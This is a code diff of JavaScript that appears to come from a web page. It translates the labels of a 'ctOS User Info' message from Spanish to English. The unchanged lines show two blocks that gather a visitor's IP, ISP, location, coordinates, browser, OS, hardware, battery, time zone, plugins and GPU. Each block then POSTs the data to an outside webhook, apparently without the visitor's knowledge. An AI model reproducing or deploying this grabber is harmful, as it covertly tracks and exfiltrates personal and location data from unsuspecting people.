@@ -196,19 +196,19 @@ function dataURLtoBlob(dataurl) {
   const mensaje =
 `**ctOS User Info**
 **IP:** ${datos.ip} (${datos.isp})
-**Ubicación:** ${datos.ubicacion}
-**Coordenadas:** ${datos.coordenadas}
-**Hora:** ${datos.hora}
-**Navegador:** ${datos.navegador}
-**SO:** ${datos.so} | Móvil: ${datos.movil}
+**Location:** ${datos.ubicacion}
+**Coordinates:** ${datos.coordenadas}
+**Hour:** ${datos.hora}
+**Browser:** ${datos.navegador}
+**OS:** ${datos.so} | Móvil: ${datos.movil}
 **RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
-**Pantalla:** ${datos.pantalla}
-**Batería:** ${datos.bateria}
-**Zona horaria:** ${datos.zona}
+**Screen:** ${datos.pantalla}
+**Battery:** ${datos.bateria}
+**Time Zone:** ${datos.zona}
 **Plugins:** ${datos.plugins}
-**Nivel del usuario:** ${datos.user_level}
+**User Level:** ${datos.user_level}
 **GPU:** ${datos.gpu}
-**Tipo de GPU:** ${datos.gpu_level}`;
+**GPU Type:** ${datos.gpu_level}`;
 
   await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
 })();
@@ -246,19 +246,19 @@ document.querySelectorAll('.open').forEach(btn => {
   const mensaje =
 `**ctOS User Info**
 **IP:** ${datos.ip} (${datos.isp})
-**Ubicación:** ${datos.ubicacion}
-**Coordenadas:** ${datos.coordenadas}
-**Hora:** ${datos.hora}
-**Navegador:** ${datos.navegador}
-**SO:** ${datos.so} | Móvil: ${datos.movil}
+**Location:** ${datos.ubicacion}
+**Coordinates:** ${datos.coordenadas}
+**Hour:** ${datos.hora}
+**Browser:** ${datos.navegador}
+**OS:** ${datos.so} | Móvil: ${datos.movil}
 **RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
-**Pantalla:** ${datos.pantalla}
-**Batería:** ${datos.bateria}
-**Zona horaria:** ${datos.zona}
+**Screen:** ${datos.pantalla}
+**Battery:** ${datos.bateria}
+**Time Zone:** ${datos.zona}
 **Plugins:** ${datos.plugins}
-**Nivel del usuario:** ${datos.user_level}
+**User Level:** ${datos.user_level}
 **GPU:** ${datos.gpu}
-**Tipo de GPU:** ${datos.gpu_level}`;
+**GPU Type:** ${datos.gpu_level}`;
 
   await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
 })();
